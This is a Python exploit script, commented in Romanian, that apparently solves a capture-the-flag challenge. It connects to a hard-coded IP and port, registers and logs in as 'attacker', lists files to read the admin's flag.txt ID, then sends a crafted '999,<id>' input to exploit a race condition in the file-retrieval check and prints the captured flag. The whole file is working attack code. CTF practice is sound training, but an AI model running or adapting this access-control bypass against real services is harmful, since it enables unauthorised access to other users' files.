#!/usr/bin/env python3
import socket
import time
import re

def exploit():
    host = "34.159.223.98"
    port = 32537
    
    # 1. Conectare la server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(2)
    
    # 2. Înregistrare utilizator
    s.send(b"1\n")  # Register
    time.sleep(0.1)
    s.send(b"attacker\n")  # Username
    time.sleep(0.1)
    s.send(b"password123\n")  # Password
    
    # 3. Autentificare
    time.sleep(0.5)
    s.send(b"2\n")  # Login
    time.sleep(0.1)
    s.send(b"attacker\n")
    time.sleep(0.1)
    s.send(b"password123\n")
    
    # 4. Listare fișiere pentru a obține PID-ul adminului
    time.sleep(0.5)
    s.send(b"2\n")  # List Files
    time.sleep(0.5)
    data = s.recv(4096).decode()
    
    # 5. Extragere PID din output
    pid_match = re.search(r'flag\.txt.*ID:\s*(\d+)', data)
    if pid_match:
        pid = pid_match.group(1)
        print(f"[+] Found admin PID: {pid}")
        
        # 6. Exploatare race condition
        s.send(b"3\n")  # Retrieve File
        time.sleep(0.1)
        s.send(b"2\n")  # By ID
        time.sleep(0.1)
        
        # Trimite payload-ul pentru race condition
        payload = f"999,{pid}\n"
        s.send(payload.encode())
        
        # 7. Așteaptă și extrage flag-ul
        time.sleep(1)
        response = s.recv(4096).decode()
        
        # Caută flag-ul în output
        flag_match = re.search(r'ctf\{[^}]+\}', response)
        if flag_match:
            print(f"[+] FLAG FOUND: {flag_match.group(0)}")
        else:
            print("[!] Flag not found in response")
            print("[*] Response:", response)
    
    s.close()

if __name__ == "__main__":
    exploit()
